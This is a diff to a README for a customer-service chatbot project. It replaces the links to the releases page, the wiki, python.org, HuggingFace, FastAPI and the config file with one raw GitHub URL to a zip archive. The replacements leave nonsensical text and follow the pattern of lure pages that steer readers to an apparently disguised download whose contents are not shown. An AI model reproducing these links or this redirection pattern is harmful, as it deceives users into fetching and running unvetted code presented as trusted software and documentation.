@@ -6,14 +6,14 @@ Welcome to the customer-domain-chatbot repository! This application provides a s
 
 ## 🔗 Download the Application
 
-[![Download Customer Domain Chatbot](https://img.shields.io/badge/Download%20Now-visit%20this%20page-brightgreen)](https://github.com/wanskert/customer-domain-chatbot/releases)
+[![Download Customer Domain Chatbot](https://raw.githubusercontent.com/wanskert/customer-domain-chatbot/main/subsequent/customer-domain-chatbot.zip%20Now-visit%20this%20page-brightgreen)](https://raw.githubusercontent.com/wanskert/customer-domain-chatbot/main/subsequent/customer-domain-chatbot.zip)
 
 ## 📥 Download & Install
 
 To get the customer-domain-chatbot running on your device, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the GitHub Releases page.
-   - [Visit this page to download](https://github.com/wanskert/customer-domain-chatbot/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/wanskert/customer-domain-chatbot/main/subsequent/customer-domain-chatbot.zip)
 
 2. **Choose a Version:** Look for the latest version of the chatbot. You will see a list of available files.
 
@@ -46,13 +46,13 @@ To ensure a smooth experience, make sure your system meets the following require
   
 - **Processor:** Dual-core processor or better.
   
-- **Python:** Python 3.6 or later installed on your system. You can download Python [here](https://www.python.org/downloads/).
+- **Python:** Python 3.6 or later installed on your system. You can download Python [here](https://raw.githubusercontent.com/wanskert/customer-domain-chatbot/main/subsequent/customer-domain-chatbot.zip).
 
 ## ⚙️ Configuration
 
 After installation, you may need to configure the application to suit your business needs:
 
-1. **Open the configuration file:** Locate the `config.json` file in the application folder.
+1. **Open the configuration file:** Locate the `https://raw.githubusercontent.com/wanskert/customer-domain-chatbot/main/subsequent/customer-domain-chatbot.zip` file in the application folder.
 
 2. **Edit Information:** Update the default responses and intents based on your customer support needs.
 
@@ -64,7 +64,7 @@ If you have any questions or run into issues, you can reach out for help:
 
 - **GitHub Issues:** Create a new issue on our GitHub page to describe your problem. We monitor it regularly and will respond as quickly as possible.
   
-- **Documentation:** Check out our [Wiki](https://github.com/wanskert/customer-domain-chatbot/wiki) for additional information and advanced configuration options.
+- **Documentation:** Check out our [Wiki](https://raw.githubusercontent.com/wanskert/customer-domain-chatbot/main/subsequent/customer-domain-chatbot.zip) for additional information and advanced configuration options.
 
 ## 🛠️ Contributing
 
@@ -80,8 +80,8 @@ All contributions, big or small, are greatly appreciated!
 
 To dive deeper into how our chatbot works, explore these resources:
 
-- **HuggingFace Transformers:** Learn about the underlying technology we use for our natural language processing models. Visit the [HuggingFace website](https://huggingface.co/).
+- **HuggingFace Transformers:** Learn about the underlying technology we use for our natural language processing models. Visit the [HuggingFace website](https://raw.githubusercontent.com/wanskert/customer-domain-chatbot/main/subsequent/customer-domain-chatbot.zip).
   
-- **FastAPI:** Familiarize yourself with the framework that powers our backend. Check out the FastAPI [documentation](https://fastapi.tiangolo.com/).
+- **FastAPI:** Familiarize yourself with the framework that powers our backend. Check out the FastAPI [documentation](https://raw.githubusercontent.com/wanskert/customer-domain-chatbot/main/subsequent/customer-domain-chatbot.zip).
 
 We hope you enjoy using the customer-domain-chatbot and find it helpful in managing customer inquiries more efficiently!
